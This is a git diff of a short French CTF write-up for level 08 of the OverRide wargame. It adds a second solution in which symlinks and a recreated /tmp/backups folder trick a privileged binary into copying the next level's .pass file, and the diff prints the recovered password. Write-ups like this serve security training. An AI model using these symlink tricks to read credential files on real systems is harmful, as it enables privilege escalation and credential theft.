@@ -1,5 +1,7 @@
 # Level 08
 
+## First solution
+
 ### Protections
 
 ![](Ressources/protections.png)
@@ -39,6 +41,21 @@ level08@OverRide:~$ ln -s /home/users/level09/.pass mouahahah
 level08@OverRide:~$ ./level08 mouahahah
 level08@OverRide:~$ cat backups/mouahahah 
 fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
+
+## Second solution
+
+Au lieu de chmod le home on peut recreer le dossier backups dans /tmp/
+Creer un dossier sur lequel on va link le home du level09
+Executer le binaire depuis le dossier /tmp/ avec comme parametre le .pass du dossier link sur le home
+
+```
+mkdir -p /tmp/backups/link/
+ln -s /home/users/level09 /tmp/link
+cd /tmp/
+~/level08 link/.pass
+
+cat /tmp/backups/link/.pass
 ```
 
 **fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S**
